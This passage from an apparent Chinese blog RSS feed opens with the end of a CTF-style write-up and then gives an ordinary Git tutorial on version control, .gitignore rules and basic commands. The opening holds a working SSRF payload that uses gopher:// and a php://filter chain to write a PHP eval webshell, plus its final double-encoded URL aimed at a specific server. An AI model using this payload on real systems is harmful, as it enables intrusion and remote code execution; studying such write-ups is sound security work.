&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cookie: PHPSESSID=bv2afbkkbbpgkio8tjmai40ob7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file=php://filter/%2577rite=string.rot13|convert.Base64-decode|convert.iconv.utf-7.utf-8/resource=1.php&amp;amp;content=K0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;最后 payload 如下，传入参数需要注意二次 url 编码：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=gopher://127.0.0.1:40000/_POST%2520/index.php%2520HTTP/1.1%250AHost%253A%2520127.0.0.1%250ACookie%253A%2520PHPSESSID%253Dbv2afbkkbbpgkio8tjmai40ob7%250AContent-Length%253A%2520174%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AConnection%253A%2520close%250d%250A%250Afile%253Dphp%253A//filter/%25252577rite%253Dstring.rot13%257Cconvert.Base64-decode%257Cconvert.iconv.utf-7.utf-8/resource%253D1.php%2526content%253DK0FEdz9waHAgZXZhbCgrQUNRQVh3LUdFVCtBRnMtMCtBRjApK0FEcz8rQUQ0LQ&lt;/code&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/16/Git-Docker/</guid>
            <title>Git&amp;Docker</title>
            <link>http://example.com/2024/04/16/Git-Docker/</link>
            <pubDate>Tue, 16 Apr 2024 09:58:59 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;git&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git&#34;&gt;#&lt;/a&gt; Git&lt;/h1&gt;
&lt;h2 id=&#34;版本控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#版本控制&#34;&gt;#&lt;/a&gt; 版本控制&lt;/h2&gt;
&lt;h3 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h3&gt;
&lt;h4 id=&#34;1什么是版本控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1什么是版本控制&#34;&gt;#&lt;/a&gt; 1. 什么是版本控制&lt;/h4&gt;
&lt;p&gt;​	版本控制（Revision control）是一种在开发的过程中用于管理我们对文件、目录或工程等内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。简单来说就是用于管理多人协同开发项目的技术。 &lt;strong&gt;版本迭代&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;2为什么要有版本控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2为什么要有版本控制&#34;&gt;#&lt;/a&gt; 2. 为什么要有版本控制？&lt;/h4&gt;
&lt;p&gt;​    没有进行版本控制或者版本控制本身缺乏正确的流程管理，在软件开发过程中将会引入很多问题，如软件代码的一致性、软件内容的冗余、软件过程的事物性、软件开发过程中的并发性、软件源代码的安全性，以及软件的整合等问题。无论是工作还是学习，或者是自己做笔记，都经历过这样一个阶段！我们就迫切需要一个版本控制工具。（多人开发就必须要使用版本控制）&lt;br&gt;
​    使用版本控制之后可以给你带来的一些便利：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;● 实现跨区域多人协同开发&lt;br&gt;
● 追踪和记载一个或者多个文件的历史记录&lt;br&gt;
● 组织和保护你的源代码和文档&lt;br&gt;
● 统计工作量&lt;br&gt;
● 并行开发、提高开发效率&lt;br&gt;
● 跟踪记录整个软件的开发过程&lt;br&gt;
● 减轻开发人员的负担，节省时间，同时降低人为错误&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;3常见版本控制工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3常见版本控制工具&#34;&gt;#&lt;/a&gt; 3. 常见版本控制工具&lt;/h4&gt;
&lt;p&gt;主流的版本控制器有如下这些：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;● &lt;strong&gt;Git&lt;/strong&gt;&lt;br&gt;
● SVN（Subversion）&lt;br&gt;
● CVS（Concurrent Versions System）&lt;br&gt;
● VSS（Micorosoft Visual SourceSafe）&lt;br&gt;
● TFS（Team Foundation Server）&lt;br&gt;
● Visual Studio Online&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;版本控制产品非常的多（Perforce、Rational ClearCase、RCS（GNU Revision Control System）、Serena Dimention、SVK、BitKeeper、Monotone、Bazaar、Mercurial、SourceGear Vault），现在影响力最大且使用最广泛的是 Git 与 SVN&lt;/p&gt;
&lt;h3 id=&#34;分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h3&gt;
&lt;h4 id=&#34;1本地版本控制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1本地版本控制&#34;&gt;#&lt;/a&gt; 1. 本地版本控制&lt;/h4&gt;
&lt;p&gt;记录文件每次的更新，可以对每个版本做一个快照，或是记录补丁文件，适合个人用，如 RCS。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/7OWankz9bgmRxvZ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2集中式版本控制-svn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2集中式版本控制-svn&#34;&gt;#&lt;/a&gt; 2. 集中式版本控制 （SVN）&lt;/h4&gt;
&lt;p&gt;所有的版本数据都保存在服务器上，协同开发者从服务器上同步更新或上传自己的修改。&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/EvP4MYdpjqthKH1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;所有的版本数据都存在服务器上，用户的本地只有自己以前所同步的版本，如果不连网的话，用户就看不到历史版本，也无法切换版本验证问题，或在不同分支工作。而且，所有数据都保存在单一的服务器上，有很大的风险这个服务器会损坏，这样就会丢失所有的数据，当然可以定期备份。代表产品：SVN、CVS、VSS。&lt;/p&gt;
&lt;h4 id=&#34;3分布式版本控制-git&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3分布式版本控制-git&#34;&gt;#&lt;/a&gt; 3. 分布式版本控制 （Git）&lt;/h4&gt;
&lt;p&gt;每个人都有全部代码，所以有一定风险&lt;/p&gt;
&lt;p&gt;所有版本信息仓库全部同步到本地的每个用户，这样就可以在本地查看所有版本历史，可以离线在本地提交，只需在连网时 push 到相应的服务器或其他用户那里。由于每个用户那里保存的都是所有的版本数据，只要有一个用户的设备没有问题就可以恢复所有的数据，但这增加了本地存储空间的占用。&lt;/p&gt;
&lt;p&gt;不会因为服务器损坏或者网络问题造成不能工作的情况&lt;/p&gt;
&lt;h3 id=&#34;git和svn的区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git和svn的区别&#34;&gt;#&lt;/a&gt; Git 和 SVN 的区别&lt;/h3&gt;
&lt;p&gt;​	SVN 是&lt;strong&gt;集中式版本控制系统&lt;/strong&gt;，版本库是集中放在&lt;strong&gt;中央服务器&lt;/strong&gt;的，而工作的时候，用的都是自己的电脑，所以首先要从中央服务器得到最新的版本，然后工作，完成工作后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是&lt;strong&gt;必须联网&lt;/strong&gt;才能工作，对网络带宽要求较高。&lt;br&gt;
​       Git 是&lt;strong&gt;分布式版本控制系统&lt;/strong&gt;，&lt;strong&gt;没有中央服务器&lt;/strong&gt;，每个人的电脑就是一个完整的版本库，工作的时候&lt;strong&gt;不需要联网&lt;/strong&gt;了，因为版本都在自己电脑上。协同的方法是这样的：比如说自己在电脑上改了文件 A，其他人也在电脑上改了文件 A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。Git 可以直接看到更新了哪些代码和文件！&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Git 是目前世界上最先进的分布式版本控制系统。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;git理论&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git理论&#34;&gt;#&lt;/a&gt; Git 理论&lt;/h2&gt;
&lt;h3 id=&#34;工作区域&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工作区域&#34;&gt;#&lt;/a&gt; 工作区域&lt;/h3&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;** 工作区（workspace）：** 就是你在电脑里能看到的目录。&lt;/li&gt;
&lt;li&gt;** 暂存区（index）：** 英文叫 stage 或 index。一般存放在 &lt;strong&gt;.git&lt;/strong&gt; 目录下的 index 文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。&lt;/li&gt;
&lt;li&gt;** 版本库（Repository）：** 工作区有一个隐藏目录 &lt;strong&gt;.git&lt;/strong&gt;，这个不算工作区，而是 Git 的版本库。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;远程 Git 仓库（Remote)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/4wdCj32AFk1QaiZ.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;工作流程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工作流程&#34;&gt;#&lt;/a&gt; 工作流程&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 在本地目录添加、修改文件&lt;/p&gt;
&lt;p&gt;2. 将需要进行版本管理的文件添加至暂存区  //git add .&lt;/p&gt;
&lt;p&gt;3. 将暂存区文件提交到 Git 仓库  //git commit&lt;/p&gt;
&lt;p&gt;4. 将本地仓库文件提交到远程仓库  //git push&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;git 管理的文件有三种状态：已修改（modified）、已暂存（staged）、已提交（committed）&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/16/tga7QNjrkfeCIOn.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;本地项目搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#本地项目搭建&#34;&gt;#&lt;/a&gt; 本地项目搭建&lt;/h4&gt;
&lt;p&gt;1. 创建一个全新仓库&lt;/p&gt;
&lt;p&gt;初始化：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git init&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;2. 克隆远程仓库&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;git clone [url] //https://github.com/Fc04dB/Fc04dB.github.io/tree/main/2024/04&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;git文件操作&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git文件操作&#34;&gt;#&lt;/a&gt; Git 文件操作&lt;/h3&gt;
&lt;h4 id=&#34;文件状态&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件状态&#34;&gt;#&lt;/a&gt; 文件状态&lt;/h4&gt;
&lt;p&gt;版本控制就是对文件的版本控制，要对文件进行修改、提交等操作，首先要知道文件当前在什么状态，不然可能会提交了现在还不想提交的文件，或者要提交的文件没提交上。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Untracked: 未跟踪，此文件在文件夹中，但并没有加入到 git 库，不参与版本控制。通过 git add 状态变为 Staged.&lt;/li&gt;
&lt;li&gt;Unmodify: 文件已经入库，未修改，即版本库中的文件快照内容与文件夹中完全一致。这种类型的文件有两种去处，如果它被修改，而变为 Modified. 如果使用 git rm 移出版本库，则成为 Untracked 文件&lt;/li&gt;
&lt;li&gt;Modified: 文件已修改，仅仅是修改，并没有进行其他的操作。这个文件也有两个去处，通过 git add 可进入暂存 staged 状态，使用 git checkout 则丢弃修改过，返回到 unmodify 状态，这个 git checkout 即从库中取出文件，覆盖当前修改！&lt;/li&gt;
&lt;li&gt;Staged: 暂存状态。执行 git commit 则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为 Unmodify 状态。执行 git reset HEAD filename 取消暂存，文件状态为 Modified&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;查看文件状态&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看文件状态&#34;&gt;#&lt;/a&gt; 查看文件状态&lt;/h4&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#查看指定文件状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git status [filename]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#查看所有文件状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;git status&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git add .                  添加所有文件到暂存区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git commit -m &amp;quot;消息内容&amp;quot;    提交暂存区中的内容到本地仓库 -m 提交信息&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;忽略文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#忽略文件&#34;&gt;#&lt;/a&gt; 忽略文件&lt;/h4&gt;
&lt;p&gt;有些时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件，设计文件等&lt;/p&gt;
&lt;p&gt;在主目录下建立 &amp;quot;.gitignore&amp;quot; 文件，此文件有如下规则：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;忽略文件中的空行或以井号（#）开始的行将会被忽略。&lt;/li&gt;
&lt;li&gt;可以使用 Linux 通配符。例如：星号（*）代表任意多个字符，问号（？）代表一个字符，方括号（[abc]）代表可选字符范围，大括号（{string1,string2,…}）代表可选的字符串等。&lt;/li&gt;
&lt;li&gt;如果名称的最前面有一个感叹号（!），表示例外规则，将不被忽略。&lt;/li&gt;
&lt;li&gt;如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略。&lt;/li&gt;
&lt;li&gt;如果名称的最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件（默认文件或目录都忽略）。&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#为注释&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;*.txt        #忽略所有 .txt结尾的文件,这样的话上传就不会被选中！&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!lib.txt     #但lib.txt除外&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/temp        #仅忽略项目根目录下的TODO文件,不包括其它目录temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;build/       #忽略build/目录下的所有文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;doc/*.txt    #会忽略 doc/notes.txt 但不包括 doc/server/arch.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;git命令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git命令&#34;&gt;#&lt;/a&gt; Git 命令&lt;/h2&gt;
&lt;p&gt;仓库：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 在当前目录新建一个Git代码库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git init&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 新建一个目录，将其初始化为Git代码库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git init [project-name]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 下载一个项目和它的整个代码历史&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git clone [url]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;配置：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 显示当前的Git配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git config --list&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 编辑Git配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git config -e [--global]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 设置提交代码时的用户信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git config [--global] user.name &amp;quot;[name]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git config [--global] user.email &amp;quot;[email address]&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;增加 / 删除文件：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# 添加指定文件到暂存区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git add [file1] [file2] ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 添加指定目录到暂存区，包括子目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git add [dir]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 添加当前目录的所有文件到暂存区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git add .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 添加每个变化前，都会要求确认&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 对于同一个文件的多处变化，可以实现分次提交&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git add -p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 删除工作区文件，并且将这次删除放入暂存区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git rm [file1] [file2] ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 停止追踪指定文件，但该文件会保留在工作区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git rm --cached [file]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# 改名文件，并且将这个改名放入暂存区&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ git mv [file-original] [file-renamed]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;代码提交：&lt;/p&gt;
